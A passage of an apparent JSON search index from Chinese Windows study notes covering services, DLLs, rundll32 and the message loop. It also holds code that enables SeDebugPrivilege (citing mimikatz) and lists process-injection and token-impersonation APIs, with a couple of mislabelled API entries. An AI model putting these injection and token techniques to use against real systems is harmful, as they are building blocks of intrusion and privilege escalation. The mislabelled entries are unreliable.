\u91cc\u5b9a\u4e49\u7684\u4e1c\u897f\uff09\u3002","title":"\u5b9e\u73b0\u670d\u52a1\u53e5\u67c4&amp;\u6539\u53d8\u72b6\u6001\u4fe1\u606f"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/%E6%9D%82%E8%AE%B0/%E6%9D%82%E8%AE%B0/#demo","text":"#include<Windows.h> SERVICE_STATUS m_ServiceStatus; SERVICE_STATUS_HANDLE m_ServiceStatusHandle; BOOL bRunning; int main() { WCHAR Servicename[] = L\"ServiceA\"; SERVICE_TABLE_ENTRY Table[] = { {Servicename,ServiceMain},{NULL,NULL} }; StartServiceCtrlDispatcher(Table); } void WINAPI ServiceMain(DWORD argc, LPTSTR* argv) { m_ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS; m_ServiceStatus.dwCurrentState = SERVICE_START_PENDING; m_ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP; m_ServiceStatus.dwWin32ExitCode = 0; m_ServiceStatus.dwServiceSpecificExitCode = 0; m_ServiceStatus.dwCheckPoint = 0; m_ServiceStatus.dwWaitHint = 0; m_ServiceStatusHandle = RegisterServiceCtrlHandler(L\"ServiceA\", HandlerFunc); m_ServiceStatus.dwCurrentState = SERVICE_RUNNING; m_ServiceStatus.dwCheckPoint = 0; m_ServiceStatus.dwWaitHint = 0; SetServiceStatus(m_ServiceStatusHandle, &m_ServiceStatus); bRunning = true; while (bRunning) { //your code } return 0; } void WINAPI HandlerFunc(DWORD code) { switch (code) { case SERVICE_CONTROL_PAUSE: m_ServiceStatus.dwCurrentState = SERVICE_PAUSED; break; case SERVICE_CONTROL_CONTINUE: m_ServiceStatus.dwCurrentState = SERVICE_RUNNING; break; case SERVICE_CONTROL_STOP: m_ServiceStatus.dwWin32ExitCode = 0; m_ServiceStatus.dwCurrentState = SERVICE_STOPPED; m_ServiceStatus.dwCheckPoint = 0; m_ServiceStatus.dwWaitHint = 0; SetServiceStatus(m_ServiceStatusHandle, &m_ServiceStatus); bRunning = false; break; case SERVICE_CONTROL_INTERROGATE: break; } }","title":"DEMO"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/%E6%9D%82%E8%AE%B0/%E6%9D%82%E8%AE%B0/#sedebugprivilege","text":"\u6709\u5f88\u591a\u5de5\u5177\u9700\u8981\u542f\u7528SeDebugPrivilege\u624d\u80fd\u6b63\u5e38\u4f7f\u7528\uff0c\u6bd4\u5982mimikatz\u5c31\u6709\u4e2a\u5f88\u7ecf\u5178\u7684 privilege::debug.\u5982\u679c\u6ca1\u6709\u8fd9\u4e2a\u6743\u9650\uff0cadministrator\u7528openprocess\u53ef\u80fd\u90fd\u4f1a\u62a5\u9519\uff0c\u6240\u4ee5\u9700\u8981\u63d0\u5347\uff0c\u7ba1\u7406\u5458\u7ec4\u62e5\u6709\u8be5\u6743\u9650\u4f46\u9ed8\u8ba4\u7981\u7528\uff0c\u666e\u901a\u7528\u6237\u4e0d\u62e5\u6709\u8be5\u6743\u9650\uff0c\u4e5f\u5c31\u662f\u8bf4\u4ec5\u4ec5\u53ea\u6709\u7ba1\u7406\u5458\u8d26\u6237\u80fd\u542f\u7528\u8be5\u6743\u9650\u3002\u8fd9\u4e2a\u6743\u9650\u63d0\u4f9b\u4e86\u5f3a\u5927\u7684\u80fd\u529b\u4ee5\u81f3\u4e8e\u53ef\u4ee5\u5ffd\u89c6\u5b89\u5168\u4e0a\u4e0b\u6587\u884c\u52a8\u3002 \u6211\u4eec\u4f1a\u7528\u5230AdjustTokenPrivileges\u548cLookupPrivilegeValueA\uff0c\u4ee5\u53caToken PRIVILEGES\u7ed3\u6784\u6811","title":"\u542f\u7528SeDebugPrivilege"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/%E6%9D%82%E8%AE%B0/%E6%9D%82%E8%AE%B0/#token-privileges","text":"typedef struct _TOKEN_PRIVILEGES { DWORD PrivilegeCount; LUID_AND_ATTRIBUTES Privileges[ANYSIZE_ARRAY]; } TOKEN_PRIVILEGES, *PTOKEN_PRIVILEGES; PrirvilegeCount \u8868\u793aPrivileges\u6570\u7ec4\u4e2d\u6709\u591a\u5c11\u4e2a\u5143\u7d20 Privileges \u6307\u5411LUID_AND_ATTRIBUTES\u7ed3\u6784\uff0c\u8be5\u7ed3\u6784\u7528\u4e8e\u5177\u4f53\u8868\u793a\u67d0\u4e2a\u6743\u9650\u7684\u5f00\u542f\u6216\u5173\u95ed typedef struct _LUID_AND_ATTRIBUTES { LUID Luid; DWORD Attributes; } LUID_AND_ATTRIBUTES, *PLUID_AND_ATTRIBUTES;` Luid \u9009\u62e9\u4e00\u4e2aLUID\u503c\uff0c\u8be5\u503c\u5bf9\u5e94\u4e00\u4e2a\u6743\u9650 Attributes \u9009\u62e9\u6307\u5b9aLUID\u7684\u6743\u9650\u7684\u5f00\u653e\u6216\u5173\u95ed\uff0c\u5176\u8be6\u7ec6\u53c2\u6570\u5982\u4e0b \u200b SE_PRIVILEGE_ENABLED The privilege is enabled. \u200b SE_PRIVILEGE_ENABLED_BY_DEFAULT The privilege is enabled by default. \u200b SE_PRIVILEGE_REMOVED Used to remove a privilege. For details, see AdjustTokenPrivileges . \u200b SE_PRIVILEGE_USED_FOR_ACCESS The privilege was used to gain access to an object or service. This flag is used to identify the relevant privileges in a set passed by a client application that may contain unnecessary privileges. \u4e0b\u9762\u6211\u4eec\u6765\u5c55\u793a\u5982\u4f55\u5229\u7528windows \u7f16\u7a0b\u83b7\u53d6\u8be5\u6743\u9650\u3002 \u8fd9\u53ea\u662f\u4e00\u4e2a\u51fd\u6570demo\uff0c\u4fee\u6539\u5f53\u524d\u8fdb\u7a0b\u7684\u6743\u9650\u3002 BOOL GetDebugPriv() { HANDLE Token; TOKEN_PRIVILEGES tp; LUID Luid; if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &Token)) { //TOKEN_ADJUST_PRIVILEGES\u4ee3\u8868\u8981\u4fee\u6539\u4ee4\u724c\u6743\u9650 std::cout << \"OpenProcessToken ERROR\" << GetLastError() << std::endl; return false; } tp.PrivilegeCount = 1; tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &Luid)) { std::cout << \"LookupPrivilegeValue ERROR\" << GetLastError() << std::endl; return false; } tp.Privileges[0].Luid = Luid; if (!AdjustTokenPrivileges(Token, FALSE, &tp, sizeof(tp), NULL, NULL) ){ std::cout << \"AdjustTokenPrivileges ERROR\" << GetLastError() << std::endl; return false; } if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) { //ERROR_NOT_ALL_ASSIGNED\u7684\u51fa\u73b0\u539f\u56e0\u662f\uff0c\u7528\u6237\u6743\u9650\u672c\u8eab\u5c31\u6ca1\u6709sedebugprivilege return false; } else { return true; } }","title":"Token PRIVILEGES\u7ed3\u6784\u6811"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/%E6%9D%82%E8%AE%B0/%E6%9D%82%E8%AE%B0/#dll","text":"DLL\u6587\u4ef6\uff0c\u5373\u52a8\u6001\u94fe\u63a5\u5e93\u6587\u4ef6\uff0c\u5728windows\u4e2d\u8bb8\u591ape\u6587\u4ef6\u8fd0\u884c\u65f6\u9700\u8981\u5c06\u4e00\u4e9bdll\u6587\u4ef6\u52a0\u8f7d\u8fdb\u5185\u5b58\uff0c\u4ece\u800c\u8c03\u7528dll\u6587\u4ef6\u91cc\u7684\u5185\u5bb9\u3002","title":"dll\u7f16\u5199"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/%E6%9D%82%E8%AE%B0/%E6%9D%82%E8%AE%B0/#dllmain","text":"dllmain\uff0c\u662fdll\u5728\u88ab\u52a0\u8f7d\u65f6\u6267\u884c\u7684\u51fd\u6570\uff08dllmain\u5728dll\u6587\u4ef6\u4e2d\u4e0d\u662f\u5fc5\u987b\u7684\uff09 BOOL WINAPI DLLMain( //\u6307\u5411\u81ea\u8eab\u53e5\u67c4 _In_HINSTANCE hinstDLL, //\u8f7d\u5165\u72b6\u6001 _In_DWORD fdwReason, //\u52a0\u8f7d\u65b9\u5f0f\uff08\u9690\u5f0f\u3001\u663e\u5f0f\uff09 _In_LPVOID IpvReserved ); \u5176\u4e2d\uff0c\u8f7d\u5165\u72b6\u6001\u6709\u56db\u79cd\uff0c\u5982\u4e0b DLL_PROCESS_ATTACH\uff1a\u8fdb\u7a0b\u8fdb\u5165\u65f6 DLL_PROCESS_DETACH\uff1a\u8fdb\u7a0b\u9000\u51fa\u65f6 DLL_THREAD_ATTACH\uff1a\u7ebf\u7a0b\u8fdb\u5165\u65f6 DLL_THREAD_DETACH\uff1a\u7ebf\u7a0b\u9000\u51fa\u65f6 dllmain\u6839\u636e\u8f7d\u5165\u72b6\u6001\u7684\u4e0d\u540c\uff0c\u53ef\u4ee5\u505a\u51fa\u4e0d\u540c\u7684\u53cd\u5e94\u3002\u5c31\u50cf\u8fd9\u6837 #include <iostream> BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved ) { switch (ul_reason_for_call) { case DLL_PROCESS_ATTACH: std::cout << \"Process attach. \\n\"; break; case DLL_PROCESS_DETACH: std::cout << \"Process exit. \\n\"; break; case DLL_THREAD_ATTACH: std::cout << \"Thread attach. \\n\"; break; case DLL_THREAD_DETACH: std::cout << \"Thread exit. \\n\"; break; } return TRUE; }","title":"DLLMAIN"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/%E6%9D%82%E8%AE%B0/%E6%9D%82%E8%AE%B0/#dll_1","text":"dll\u7f16\u5199\u65f6\uff0c\u8981\u7528__declspec\u5173\u952e\u5b57\u6807\u660e\u54ea\u4e9b\u51fd\u6570\u662f\u8981\u5bfc\u51fa\u7684,_ __declspec(dllexport) \u7528\u4e8eWindows\u4e2d\u7684\u52a8\u6001\u5e93\u4e2d\uff0c\u58f0\u660e\u5bfc\u51fa\u51fd\u6570\u3001\u7c7b\u3001\u5bf9\u8c61\u7b49\u4f9b\u5916\u9762\u8c03\u7528,\u50cf\u8fd9\u6837 extern \"C\" int _declspec(dllexport) go() { std::cout<<\"gogo\" } \u8fd9\u6837\u5c31\u8bbe\u7f6e\u597d\u4e00\u4e2a\u7528\u4e8e\u5bfc\u51fa\u7684\u51fd\u6570\u4e86\u3002","title":"DLL \u5bfc\u51fa\u51fd\u6570"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/%E6%9D%82%E8%AE%B0/%E6%9D%82%E8%AE%B0/#dlllib","text":"\u5bf9\u4e8elib\uff08\u9759\u6001\u94fe\u63a5\u5e93\uff09\u6765\u8bf4\uff0c\u4f7f\u7528\u9759\u6001\u94fe\u63a5 dll\uff08\u52a8\u6001\u94fe\u63a5\u5e93\uff09\u6765\u8bf4\u4f7f\u7528\u52a8\u6001\u94fe\u63a5","title":"\u9898\u5916\u8bdd\uff1a\u600e\u4e48\u4f7f\u7528dll\u6216lib\u4e2d\u7684\u5bfc\u51fa\u51fd\u6570"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/%E6%9D%82%E8%AE%B0/%E6%9D%82%E8%AE%B0/#_10","text":"\u53c8\u53eb\u9690\u5f0f\u94fe\u63a5\u3002\u94fe\u63a5\u5668\u4ece\u5e93\u4e2d\u590d\u5236\u8fd9\u4e9b\u51fd\u6570\u548c\u6570\u636e\u5e76\u628a\u5b83\u4eec\u548c\u5e94\u7528\u7a0b\u5e8f\u7684\u5176\u5b83\u6a21\u5757\u7ec4\u5408\u8d77\u6765\u521b\u5efa\u6700\u7ec8\u7684\u53ef\u6267\u884c\u6587\u4ef6(.EXE\u6587\u4ef6)\uff0c\u6240\u4ee5\u7ec4\u6210\u7684exe\u6587\u4ef6\u4f53\u79ef\u8f83\u5927 #pragma comment(lib,\"testDLL.lib\") //\u5728\u6b64\u5904\u901a\u8fc7\u9759\u6001\u94fe\u63a5\uff0c\u6b64\u4e4b\u524d\u628a\u751f\u6210\u7684lib\u6587\u4ef6\u653e\u5165loadDLL\u5de5\u7a0b\u6587\u4ef6\u5939\u4e0b\u9762\uff0c\u5e76\u8bbe\u7f6e\u7f16\u8bd1\u5668\u7684\u9644\u52a0\u4f9d\u8d56\u9879\u4e2d\u589e\u52a0\u6b64lib extern \"C\"_declspec(dllimport) int go(); //\u58f0\u660e\u51fd\u6570 int main(){ go(); }","title":"\u9759\u6001\u94fe\u63a5"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/%E6%9D%82%E8%AE%B0/%E6%9D%82%E8%AE%B0/#_11","text":"\u53c8\u53eb\u663e\u793a\u94fe\u63a5\uff0c\u5c06\u4e00\u4e9bapi\u51fd\u6570\u5199\u5165\u5230\u4e00\u4e2adll\u6587\u4ef6\u4e2d\uff0c\u5728\u7a0b\u5e8f\u5728\u7a0b\u5e8f\u8fd0\u884c\u65f6\u518d\u52a0\u8f7d\u5230\u7a0b\u5e8f\u7684\u8fdb\u7a0b\u7a7a\u95f4\u4e2d\u4f7f\u7528\uff0c\u8fd9\u6837\u53ef\u4ee5\u8ba9\u8fd0\u884c\u7a0b\u5e8f\u672c\u8eab\u4f53\u79ef\u8f83\u5c0f\uff0c\u65b9\u4fbf\u6a21\u5757\u5316\u7f16\u7a0b\u3002 int TestDLL() { HMODULE hModule = NULL; typedef int (*Func)(int a, int b); // \u52a8\u6001\u52a0\u8f7d DLL \u6587\u4ef6 hModule = LoadLibrary(_TEXT(\"..//Debug//FuncDll.dll\" )); // \u83b7\u53d6 fun\u51fd\u6570\u5730\u5740 Func fAdd = (Func)GetProcAddress(hModule, \"fun\" ); // \u4f7f\u7528\u51fd\u6570\u6307\u9488 printf(\"%d/n\" , fAdd(3, 1)); // \u91ca\u653e\u6307\u9488 FreeLibrary(hModule); return 0; }","title":"\u52a8\u6001\u94fe\u63a5"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/%E6%9D%82%E8%AE%B0/%E6%9D%82%E8%AE%B0/#rundll32","text":"\u7528rundll32.exe \u53ef\u4ee5\u6267\u884cdll\u4e2d\u7684\u67d0\u4e00\u5bfc\u51fa\u51fd\u6570 \u4f46\u662f\u4e0d\u662f\u6240\u6709\u51fd\u6570\u90fd\u80fd\u901a\u8fc7rundll32\u8c03\u7528\uff0c\u51fd\u6570\u5fc5\u987b\u7b26\u5408\u5982\u4e0b\u5b9a\u4e49 VOID CALLBACK FunctionName (HWND hwnd,HINSTANCE hinst,LPTSTR lpCmdLine,INT nCmdShow); \u8fd9\u91cc\u968f\u4fbf\u5199\u4e86\u4e2a extern \"C\" __declspec(dllexport) void rundll(HWND hwnd, HINSTANCE hinst, LPTSTR lpCmdLine, INT nCmdShow) { MessageBox(NULL, TEXT(\"-Test-\"), TEXT(\"Rundll32\"), MB_OK); }","title":"rundll32"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/%E6%9D%82%E8%AE%B0/%E6%9D%82%E8%AE%B0/#_12","text":"","title":"\u6d88\u606f\u673a\u5236"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/%E6%9D%82%E8%AE%B0/%E6%9D%82%E8%AE%B0/#_13","text":"Windows\u662f\u57fa\u4e8e\u4e8b\u4ef6\u9a71\u52a8\u7684. \u4e00\u822c\u6765\u8bb2\uff0c \u670d\u52a1\u5668\u5904\u7406\u6a21\u578b\u6709\u4e09\u79cd: 1\u6bcf\u6536\u5230\u4e00\u4e2a\u8bf7\u6c42\uff0c\u521b\u5efa\u4e00\u4e2a\u65b0\u7684\u8fdb\u7a0b\uff0c\u6765\u5904\u7406\u8be5\u8bf7\u6c42\uff1b 2\u6bcf\u6536\u5230\u4e00\u4e2a\u8bf7\u6c42\uff0c\u521b\u5efa\u4e00\u4e2a\u65b0\u7684\u7ebf\u7a0b\uff0c\u6765\u5904\u7406\u8be5\u8bf7\u6c42\uff1b 3\u6bcf\u6536\u5230\u4e00\u4e2a\u8bf7\u6c42\uff0c\u653e\u5165\u4e00\u4e2a\u4e8b\u4ef6\u5217\u8868\uff0c\u8ba9\u4e3b\u8fdb\u7a0b\u901a\u8fc7\u975e\u963b\u585eI/O\u65b9\u5f0f\u6765\u5904\u7406\u8bf7\u6c42 1 \u5f00\u9500\u8f83\u5927:\u6bcf\u5904\u7406\u4e00\u4e2a\u4e8b\u4ef6\u5c31\u8981\u65b0\u5efa\u4e00\u4e2a\u8fdb\u7a0b\uff0c\u5f00\u9500\u592a\u5927\uff0c\u4f46\u662f\u5b9e\u73b0\u8d77\u6765\u5f88\u7b80\u5355 2 \u6b7b\u9501\u95ee\u9898:\u591a\u7ebf\u7a0b\u8c03\u8282\u5bb9\u6613\u9047\u5230\u6b7b\u9501\u95ee\u9898\uff0c\u7a0b\u5e8f\u76f4\u63a5\u5361\u6b7b 3 \u903b\u8f91\u590d\u6742 \u90a3\u4e48\u4e8b\u4ef6\u9a71\u52a8\u7684\u4f18\u52bf\u5728\u54ea\u91cc\u5462\u3002 \u6253\u4e2a\u6bd4\u65b9\uff0c\u6211\u4eec\u8981\u83b7\u53d6\u4e00\u4e2a\u9f20\u6807\u70b9\u51fb\u7684\u52a8\u4f5c\u3002 \u5982\u679c\u6211\u4eec\u901a\u8fc7\u521b\u5efa\u7ebf\u7a0b\u6216\u8005\u8fdb\u7a0b\u7684\u65b9\u6cd5\uff0c\u53bb\u5faa\u73af\u626b\u63cf\u5f53\u524d\u662f\u5426\u6709\u9f20\u6807\u70b9\u51fb\u4e8b\u4ef6\u90a3\u4e48\u53ef\u80fd\u4f1a\u9020\u6210\u8d44\u6e90\u6d6a\u8d39\uff08\u9f20\u6807\u4e00\u76f4\u4e0d\u70b9\u51fb\uff0c\u4f46\u4ecd\u5728\u8fdb\u884c\u626b\u63cf\uff09\uff0c\u54cd\u5e94\u7f13\u6162\uff08\u626b\u63cf\u7684\u8bbe\u5907\u6709\u5f88\u591a\uff0c\u4f1a\u9020\u6210\u54cd\u5e94\u7f13\u6162\u7684\u95ee\u9898\uff09\u7b49\u95ee\u9898\u3002 \u4f46\u662f\u4e8b\u4ef6\u9a71\u52a8\u5c31\u4e0d\u4e00\u6837\u4e86\uff0c\u5b83\u7684\u6838\u5fc3\u539f\u7406\u662f\u4ee5\u6d88\u606f\u961f\u5217\u4e3a\u6838\u5fc3\uff0c\u5f53\u6355\u83b7\u5230\u4e00\u4e2a\u4e8b\u4ef6\uff08\u5982\u9f20\u6807\u70b9\u51fb\uff09\u65f6\u628a\u4ed6\u653e\u8fdb\u6d88\u606f\u961f\u5217\uff0c\u7136\u540e\u5f53\u8be5\u4e8b\u4ef6\u4ece\u961f\u5217\u4e2d\u88ab\u53d6\u51fa\u65f6\uff0c\u6839\u636e\u4e8b\u4ef6\u7c7b\u578b\u8c03\u7528\u4e0d\u540c\u7684\u51fd\u6570\u6765\u8fdb\u884c\u5904\u7406,\u5176\u4e2d\u6bcf\u4e2a\u4e8b\u4ef6\u4e00\u822c\u90fd\u5404\u81ea\u4fdd\u5b58\u5404\u81ea\u7684\u5904\u7406\u51fd\u6570\u6307\u9488\uff0c\u8fd9\u6837\uff0c\u6bcf\u4e2a\u6d88\u606f\u90fd\u6709\u72ec\u7acb\u7684\u5904\u7406\u51fd\u6570 \u3002","title":"\u4e8b\u4ef6\u9a71\u52a8"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/%E6%9D%82%E8%AE%B0/%E6%9D%82%E8%AE%B0/#_14","text":"\u4e8b\u4ef6\u9a71\u52a8\u5728Windows\u4e0b\u7684\u5177\u8c61\u5316\u5c31\u662f\u6d88\u606f\u673a\u5236\u3002 \u4e8b\u4ef6\u961f\u5217\u5bf9\u5e94\u8fc7\u6765\u5c31\u662f\u6d88\u606f\u961f\u5217. \u5b83\u4f1a\u4e3a\u6bcf\u4e00\u4e2a\u5e94\u7528\u7a0b\u5e8f\u65b0\u5f00\u4e00\u4e2a\u5bf9\u5e94\u7684\u6d88\u606f\u961f\u5217\uff0c\u7528\u4e8e\u6355\u83b7\u5176\u6d88\u606f\u3002 \u6211\u4eec\u4ee5\u4e00\u4e2a\u7b80\u5355\u7684\u7a97\u53e3\u5b9e\u73b0\u6765\u770b\u770b\u6d88\u606f\u673a\u5236\u3002 \u6ce8\u610f\u4e0b\u65b9\u6ce8\u91ca\u5904\u5373\u53ef\u3002 #include<Windows.h> LRESULT CALLBACK WndProc(HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam); int WINAPI WinMain(HINSTANCE hinstance, HINSTANCE hPrevInStance, LPSTR lpCmdLine, int nShowCmd) { static TCHAR szAppName[] = TEXT(\"\u7a97\u53e3\u7c7b\u540d\u79f0\"); HWND hwnd; MSG msg; WNDCLASSEX wndclass = { 0 }; //\u8bbe\u8ba1\u7a97\u53e3\u7c7b wndclass.cbSize = sizeof(WNDCLASSEX); wndclass.style = CS_HREDRAW | CS_VREDRAW; wndclass.lpfnWndProc = WndProc; wndclass.cbClsExtra = 0; wndclass.cbWndExtra = 0; wndclass.hInstance = hinstance; wndclass.hIcon = LoadIcon(NULL, IDI_APPLICATION); wndclass.hCursor = LoadCursor(NULL, IDC_ARROW); wndclass.hbrBackground = (HBRUSH)GetStockObject(BLACK_BRUSH); wndclass.lpszMenuName = NULL; wndclass.lpszClassName = szAppName; if (!RegisterClassEx(&wndclass)) { MessageBox(NULL, TEXT(\"RegisterClassEx failed!\"),TEXT(\"title\"), MB_ICONERROR); return 0; } hwnd = CreateWindowEx(WS_EX_OVERLAPPEDWINDOW, szAppName, TEXT(\"\u7a97\u53e3\u540d\u79f0\"), WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, NULL, NULL, hinstance, NULL); ShowWindow(hwnd, nShowCmd); UpdateWindow(hwnd); while (GetMessage(&msg, hwnd, 0, 0)) { #\u4ece\u6d88\u606f\u961f\u5217\u4e2d\u83b7\u53d6\u6d88\u606f\uff0c\u82e5\u5b58\u5728\u6d88\u606f\u5f85\u5904\u7406\uff0c\u5219\u8fdb\u884c\u7a97\u53e3\u8fc7\u7a0b\u3002\u540c\u65f6\u901a\u8fc7\u53e5\u67c4\u5f97\u5230\u9700\u8981\u6355\u6349\u6d88\u606f\u7684\u5e94\u7528\u7a0b\u5e8f\u3002 TranslateMessage(&msg); DispatchMessage(&msg); } return msg.wParam; } LRESULT CALLBACK WndProc(HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam) { HDC hdc; PAINTSTRUCT ps; RECT rect; switch (message) { case WM_PAINT: hdc = BeginPaint(hwnd, &ps); GetClientRect(hwnd, &rect); DrawText(hdc, TEXT(\"FUCK\"), -1, &rect, DT_CENTER); EndPaint(hwnd, &ps); return 0; case WM_LBUTTONUP: MessageBox(NULL, TEXT(\"\u8001\u5b50\u88ab\u70b9\u4e86\"), TEXT(\"tick\"), 0); return 0; } return DefWindowProc(hwnd, message, wParam, lParam); } \u5bf9\u4e8e\u6d88\u606f\u673a\u5236\uff0c\u6709\u51e0\u4e2a\u70b9\u9700\u8981\u7279\u522b\u5173\u6ce8\u3002 1.WM_PAINT,WM_TIMER,WM_QUIT \u8fd9\u51e0\u4e2a\u6d88\u606f\u6c38\u8fdc\u88ab\u653e\u5728\u6d88\u606f\u961f\u5217\u6700\u540e\u3002 \u7a76\u5176\u539f\u56e0\u5f88\u7b80\u5355\uff0c\u5c31\u62ffWM_QUIT\u4e3e\u4f8b\uff0c\u4ed6\u662f\u610f\u601d\u662f\u9000\u51fa\uff0c\u82e5\u4e0d\u653e\u5728\u6700\u540e\uff0cWM_QUIT\u540e\u9762\u7684\u6d88\u606f\u4e5f\u5c31\u65e0\u6cd5\u5904\u7406\u4e86\u3002 2.\u4e5f\u6709\u90e8\u5206\u6d88\u606f\u662f\u975e\u961f\u5217\u6d88\u606f\uff0c\u53ef\u4ee5\u65e0\u89c6\u961f\u5217\u987a\u5e8f\u9996\u5148\u88ab\u5904\u7406\u3002","title":"\u6d88\u606f\u673a\u5236"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/%E7%94%A8%E8%BF%87%E7%9A%84WINDOWS_API%E8%AE%B0%E5%BD%95/","text":"\u7528\u8fc7\u7684WINDOWS_API\u8bb0\u5f55 \u76ee\u5f55 API:\u6536\u5f55\u4e00\u4e0b\u8c03\u8fc7\u7684API \u8fdb\u7a0b\u4e0e\u5185\u5b58 \u6253\u5f00\u4e00\u4e2a\u5df2\u5b58\u5728\u7684\u672c\u5730\u8fdb\u7a0b:OpenProcess \u5728\u6307\u5b9a\u8fdb\u7a0b\u7684\u865a\u62df\u5730\u5740\u7a7a\u95f4\u4e2d\u4fdd\u7559\uff0c\u5f00\u8f9f\uff0c\u7981\u7528\u4e00\u6bb5\u533a\u57df : VirtualAllocEx \u5728\u6307\u5b9a\u8fdb\u7a0b\u7684\u865a\u62df\u5730\u5740\u7a7a\u95f4\u4e2d\u91ca\u653e\u6216decommit\u4e00\u6bb5\u533a\u57df : VirtualFreeEx \u5411\u6307\u5b9a\u8fdb\u7a0b\u7684\u5185\u5b58\u533a\u57df\u5199\u5165: WriteProcessMemory \u5728\u4e00\u4e2a\u8fdb\u7a0b\u5185\u5b58\u7a7a\u95f4\u4e2d\u521b\u5efa\u4e00\u4e2a\u7ebf\u7a0b\uff1aCreateRemoteThread \u5173\u95ed\u4e00\u4e2a\u53e5\u67c4:CloseHandle RtlSecureZeroMemory \uff1a\u4ee5\u5b89\u5168\u65b9\u5f0f\u75280\u586b\u5145\u5185\u5b58 \u4ee4\u724c\u4e0e\u547d\u540d\u7ba1\u9053 \u521b\u5efa\u547d\u540d\u7ba1\u9053\u53e5\u67c4:CreateNamedPipeA \u5f00\u542f\u4e00\u4e2a\u547d\u540d\u7ba1\u9053\u7b49\u5f85\u94fe\u63a5: ConnectNamedPipe \u6a21\u62df\u4e00\u4e2a\u547d\u540d\u7ba1\u9053\u5ba2\u6237\u7aef:ImpersonateNamedPipeClient \u83b7\u53d6\u5f53\u524d\u7ebf\u7a0b\u4ee4\u724c\u53e5\u67c4: GetCurrentThreadToken \u4ee5\u4ee4\u724c\u521b\u5efa\u4e00\u4e2a\u8fdb\u7a0b\uff081\uff09: CreateProcessWithTokenW \u4ee5\u4ee4\u724c\u521b\u5efa\u4e00\u4e2a\u8fdb\u7a0b\uff082\uff09: CreateProcessAsUserA \u4e3a\u5df2\u5b58\u5728\u7684Token\u521b\u5efa\u526f\u672c: DuplicateTokenEx \u6587\u4ef6IO \u83b7\u5f97\u6587\u4ef6\u53e5\u67c4\uff1aGetMoudleHandleA \u4ecedll\u6587\u4ef6\u53e5\u67c4\u4e2d\u83b7\u5f97\u51fd\u6570\uff1aGetProcAddress \u83b7\u5f97\u4e00\u4e2a\u5df2\u5b58\u5728\u6587\u4ef6\u53e5\u67c4\u6216\u8005\u65b0\u5efa\u6587\u4ef6\u53e5\u67c4:CreateFile \u5199\u6587\u4ef6: ReadFile \u8bfb\u6587\u4ef6: ReadFile \u670d\u52a1 